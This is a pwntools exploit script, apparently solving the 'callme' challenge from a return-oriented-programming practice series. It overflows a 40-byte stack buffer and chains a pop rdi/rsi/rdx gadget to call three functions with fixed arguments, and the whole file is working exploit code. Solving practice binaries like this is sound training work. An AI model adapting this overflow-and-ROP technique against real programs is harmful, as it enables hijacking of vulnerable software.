from pwn import *

r = process('./callme')

payload = b'a' * 40
ret = p64(0x00000000004006be)
pop_rdi_rsi_rdx = p64(0x000000000040093c)

arg1 = p64(0xdeadbeefdeadbeef)
arg2 = p64(0xcafebabecafebabe)
arg3 = p64(0xd00df00dd00df00d)

callme_one = p64(0x00400720)

callme_two = p64(0x00400740)

callme_three = p64(0x004006f0)

payload += ret + pop_rdi_rsi_rdx + arg1 + arg2 + arg3 + callme_one
payload += pop_rdi_rsi_rdx + arg1 + arg2 + arg3 + callme_two
payload += pop_rdi_rsi_rdx + arg1 + arg2 + arg3 + callme_three

r.send(payload)

r.interactive()

